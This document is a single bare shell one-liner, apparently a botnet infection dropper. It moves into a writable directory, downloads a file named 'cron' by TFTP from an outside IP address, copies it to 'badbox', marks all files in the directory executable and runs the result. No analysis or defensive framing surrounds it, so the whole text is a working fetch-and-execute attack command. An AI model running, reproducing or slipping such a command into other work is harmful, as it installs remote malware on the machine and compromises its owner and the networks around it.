cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r cron -g 108.61.224.162;cat cron >badbox;chmod +x *;./badbox
